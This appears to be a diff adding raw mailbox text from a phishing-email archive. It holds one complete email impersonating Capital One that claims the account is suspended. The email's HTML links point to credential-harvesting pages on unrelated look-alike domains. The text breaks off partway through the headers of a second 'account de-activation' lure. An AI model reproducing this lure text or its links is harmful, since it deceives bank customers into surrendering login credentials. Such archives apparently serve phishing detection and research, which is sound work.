@@ -1,0 +1,95 @@
+From: "CapitalOne Bank" <info@bioscan.co.ke>
+Date: Wed, 26 Apr 2017 21:48:09 +0000
+X-OutGoing-Spam-Status: No, score=3.3
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - bhs101.truehost.cloud
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - bioscan.co.ke
+X-Get-Message-Sender-Via: bhs101.truehost.cloud: authenticated_id: info@bioscan.co.ke
+X-Authenticated-Sender: bhs101.truehost.cloud: info@bioscan.co.ke
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 159
+
+You will not see this in a MIME-aware mail reader.
+--===============1769509114==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+
+ =
+
+
+ =
+
+ Dear Capital One Customer.
+
+Your Capital One Internet Banking account has been temporary suspended. =
+
+
+We require you to Unlock your account Unlock Access.
+
+Sincerely,
+Capital One Security Department
+ www.capitalone.com
+
+--===============1769509114==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><P align=3Dright><IMG src=3D"https://s.graphiq=
+.com/sites/default/files/765/media/images/t2/Capital_One_827157.png" width=
+=3D210 align=3Dleft height=3D40></P><BR>
+<P><BR></P>
+<P></P>
+<P><B><FONT size=3D-1 face=3D"Verdana, Arial, Helvetica, sans-serif">Dear <=
+/FONT><FONT size=3D-1 face=3DArial><SPAN id=3Dlw_1336748011_0 class=3Dyshor=
+tcuts>Capital One</SPAN></FONT><FONT size=3D-1 face=3D"Verdana, Arial, Helv=
+etica, sans-serif"><SPAN><SUP></SUP></SPAN> Customer.</FONT></B></P><BR><FO=
+NT style=3D"FONT-SIZE: 12px; LINE-HEIGHT: 18px" color=3D#000000 size=3D2 fa=
+ce=3Dverdana,arial,helvetica,sans-serif>Your Capital One Internet Banking a=
+ccount has been temporary suspended. <BR><BR>We require you to Unlock your =
+account <B><A href=3D"http://www.christianmccannauctions.com.au/cp/images/i=
+mages/Cap1/Capitalone/OnlineBanking.htm" rel=3Dnofollow target=3D_blank><SP=
+AN id=3Dlw_1336748011_1 class=3Dyshortcuts>Unlock Access</SPAN></A></B>.<BR=
+><BR>Sincerely,<BR>Capital One Security Department</FONT><FONT size=3D-1 fa=
+ce=3D"Verdana, Arial, Helvetica, sans-serif"><BR></FONT>
+<P><FONT size=3D2 face=3DVerdana><A href=3D"http://capitalone360.com.alsheh=
+eri.com/capital360/index.html" rel=3Dnofollow target=3D_blank><B><SPAN id=
+=3Dlw_1336748011_2 class=3Dyshortcuts>www.capitalone.com</SPAN></B></A></FO=
+NT></P></TD></BODY></HTML>
+--===============1769509114==--
+
+From jose@monkey.org Sun Apr 30 22:19:29 2017 +0000
+Return-Path: no-reply@hcaecuador.com
+Delivered-To: jose@monkey.org
+X-FDA: 72788774058.15.crack87_6fe1b7f7b5858
+X-Spam-Summary: 75,0,0,c674599aef975f5d,d41d8cd98f00b204,no-reply@hcaecuador.com,:,RULES_HIT:4:41:72:152:355:379:800:962:967:969:973:983:988:989:1147:1189:1208:1221:1260:1263:1313:1314:1345:1381:1430:1431:1433:1434:1436:1437:1516:1517:1518:1571:1575:1588:1589:1592:1594:1685:1714:1730:1777:1792:2196:2198:2199:2200:2525:2560:2563:2610:2638:2682:2685:2693:2737:2827:2859:2890:2894:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3149:3351:3865:3866:3867:3868:3871:3872:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4042:4321:4361:4552:5007:6261:6653:6678:7652:8513:8518:8599:8603:8797:9025:9121:9388:10004:10215:10346:11233:11473:11480:11657:11658:11783:11914:12043:12063:12438:12555:12764:12776:12895:12986:13139:13237:13374:13846:13898:14096:14158:14651:14827:14877:21062:21080:21433:21450:21451:21483:21524:21611:30001:30021:30022:30026:30054,0,RBL:104.236.82.161-irl.urbl.hostedemail.com-127.0.0.175,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache
+X-HE-Tag: crack87_6fe1b7f7b5858
+X-Filterd-Recvd-Size: 16226
+Received: from hcaecuador.com (hcaecuador.com [104.236.82.161])
+	by imf17.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Sun, 30 Apr 2017 22:19:28 +0000 (UTC)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=hcaecuador.com; s=mail;
+	h=Message-Id:Date:From:To:Subject:MIME-Version:Content-Type; bh=Zbrv+70zO4Bczpyo6wZvcDv2PbYeVzShx/mkNZjYlVI=;
+	b=Yoo78GufzY1SPR78BOrKaY4z/fNwBGdF0VIXQrtTt/B1fTVjyzOVirM6Nh75N6V28K+x3StIoAJOABBODlNc8FzI2voOr3rzJlVW021VjJMvN3DD7dHVVjGQwuStNN7+Zd99js57pULD6qSftHAsyLL8DSPo58K8G6qriq1me2M=;
+Received: from [107.173.60.110]
+	by hcaecuador.com with esmtpa (Exim 4.82)
+	(envelope-from <no-reply@hcaecuador.com>)
+	id 1d4xBg-0003i9-DH
+	for jose@monkey.org; Sun, 30 Apr 2017 22:19:28 +0000
+Content-Type: multipart/alternative; boundary="===============1903050105=="
+MIME-Version: 1.0
+Subject: Final Warning: Account De-activation Notice for jose@monkey.org
+To: jose@monkey.org
